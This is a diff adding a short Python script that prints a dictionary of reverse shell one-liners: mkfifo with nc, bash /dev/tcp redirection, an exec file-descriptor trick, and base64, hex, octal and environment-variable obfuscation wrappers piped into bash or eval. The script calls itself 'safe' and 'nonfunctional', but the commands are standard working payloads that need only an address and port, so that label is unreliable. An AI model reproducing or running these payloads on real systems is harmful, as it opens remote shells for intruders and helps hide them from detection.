@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+"""
+Safe Reverse Shell Template Generator (nonfunctional).
+Outputs annotated templates and obfuscation examples with placeholders <IP> and <PORT>.
+Do not run these on production. Use only in an authorized lab.
+"""
+
+templates = {
+    "mkfifo_basic": {
+        "desc": "mkfifo wrapper template (placeholder IP/PORT)",
+        "template": "mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"
+    },
+    "mkfifo_tun0_style": {
+        "desc": "mkfifo variant referencing a specific interface",
+        "template": "mkfifo /tmp/f; nc <INTERFACE_OR_IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f"
+    },
+    "bash_tcp_simple": {
+        "desc": "bash tcp pseudo template (nonfunctional placeholder)",
+        "template": "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
+    },
+    "bash_tcp_exec": {
+        "desc": "exec trick (placeholder)",
+        "template": "0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"
+    },
+    "base64_wrapper": {
+        "desc": "base64-decoded payload wrapper (payload replaced by <PAYLOAD_B64>)",
+        "template": "echo \"<PAYLOAD_B64>\" | base64 -d | bash  # <PAYLOAD_B64> must be replaced manually"
+    },
+    "hex_xxd": {
+        "desc": "hex payload via xxd (payload replaced by <HEX_PAYLOAD>)",
+        "template": "echo \"<HEX_PAYLOAD>\" | xxd -p -r | bash"
+    },
+    "octal_printf": {
+        "desc": "octal printf example (placeholder string)",
+        "template": "printf '\\145\\170\\145\\143 ...' | bash  # octal bytes shown as example"
+    },
+    "env_var_obf": {
+        "desc": "environment variable concatenation obfuscation (placeholder)",
+        "template": "export A=\"exec 5<>/dev/tcp/<IP>/<PORT>\"; export B=\"; sh <&5 >&5 2>&5\"; eval \"$A$B\""
+    },
+    "eval_wrap": {
+        "desc": "eval of decoded content",
+        "template": "eval \"$(echo '<PAYLOAD_B64>' | base64 -d)\"  # placeholder"
+    }
+}
+
+def print_all():
+    for key, info in templates.items():
+        print(f"== {key} ==\n# {info['desc']}\n{info['template']}\n")
+
+if __name__ == '__main__':
+    print("Safe Reverse Shell Template Generator (placeholders only).")
+    print("Replace <IP>, <PORT>, <PAYLOAD_B64> manually only in an authorized lab.")
+    print_all()
